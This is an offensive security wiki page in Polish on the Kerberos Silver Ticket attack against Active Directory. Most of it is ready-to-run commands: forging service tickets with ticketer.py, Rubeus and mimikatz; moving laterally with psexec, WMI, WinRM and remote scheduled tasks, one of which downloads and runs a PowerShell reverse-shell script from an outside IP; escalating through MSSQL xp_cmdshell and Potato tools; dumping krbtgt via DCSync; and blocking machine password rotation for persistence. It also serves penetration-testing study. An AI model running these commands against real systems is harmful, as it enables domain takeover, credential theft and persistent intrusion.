# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Atak Silver Ticket polega na wykorzystaniu service tickets w środowiskach Active Directory (AD). Metoda ta opiera się na zdobyciu NTLM hash konta usługi (np. konta komputera), aby sfałszować Ticket Granting Service (TGS) ticket. Dzięki takiemu sfałszowanemu ticketowi atakujący może uzyskać dostęp do konkretnych usług w sieci, podszywając się pod dowolnego użytkownika, zwykle dążąc do uprawnień administracyjnych. Należy podkreślić, że użycie AES keys do fałszowania biletów jest bezpieczniejsze i trudniejsze do wykrycia.

> [!WARNING]
> Silver Tickets są mniej wykrywalne niż Golden Tickets, ponieważ wymagają tylko **hash of the service account**, a nie konta krbtgt. Jednak są ograniczone do konkretnej usługi, na którą są skierowane. Ponadto, wystarczy jedynie skraść hasło użytkownika. Ponadto, jeśli przejmiesz **account's password with a SPN** możesz użyć tego hasła do stworzenia Silver Ticket podszywającego się pod dowolnego użytkownika dla tej usługi.

Do tworzenia ticketów stosuje się różne narzędzia w zależności od systemu operacyjnego:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### W systemie Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Usługa CIFS jest wyróżniana jako częsty cel uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystane do uruchamiania zadań i zapytań WMI.

### Przykład: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Jeśli masz NTLM hash (lub AES key) konta usługi SQL (np. sqlsvc), możesz sfałszować TGS dla MSSQL SPN i podszyć się pod dowolnego użytkownika względem usługi SQL. Następnie włącz xp_cmdshell, aby wykonywać polecenia jako konto usługi SQL. Jeśli ten token ma SeImpersonatePrivilege, użyj Potato, aby uzyskać eskalację do SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Jeśli otrzymany kontekst ma SeImpersonatePrivilege (często prawda dla kont usługowych), użyj wariantu Potato, aby uzyskać SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Więcej szczegółów dotyczących wykorzystywania MSSQL i włączania xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Przegląd technik Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostępne usługi

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu również:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach możesz po prostu poprosić o: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Używając **Rubeus** możesz **zażądać wszystkich** tych ticketów używając parametru:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets — ID zdarzeń

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Persistence

Aby zapobiec rotacji haseł maszyn co 30 dni ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` lub możesz ustawić `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na wartość większą niż 30 dni, aby wskazać okres rotacji, po którym hasło maszyny powinno zostać zmienione.

## Abusing Service tickets

W poniższych przykładach załóżmy, że ticket został pozyskany podszywając się pod konto administratora.

### CIFS

Dzięki temu ticketowi będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` przez **SMB** (jeśli są udostępnione) i skopiować pliki do części zdalnego systemu plików wykonując coś w stylu:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Będziesz także w stanie uzyskać shell na hoście lub wykonać dowolne polecenia za pomocą **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Dzięki temu uprawnieniu możesz tworzyć zadania zaplanowane na zdalnych komputerach i wykonywać dowolne polecenia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Dzięki tym ticketom możesz **uruchomić WMI w systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji o wmiexec** na następującej stronie:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mając dostęp do komputera przez winrm możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź następującą stronę, aby poznać **więcej sposobów łączenia się ze zdalnym hostem przy użyciu winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Pamiętaj, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby uzyskać do niego dostęp.

### LDAP

Dzięki temu uprawnieniu możesz zrzucić bazę danych DC przy użyciu **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na następującej stronie:


{{#ref}}
dcsync.md
{{#endref}}


## Źródła

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
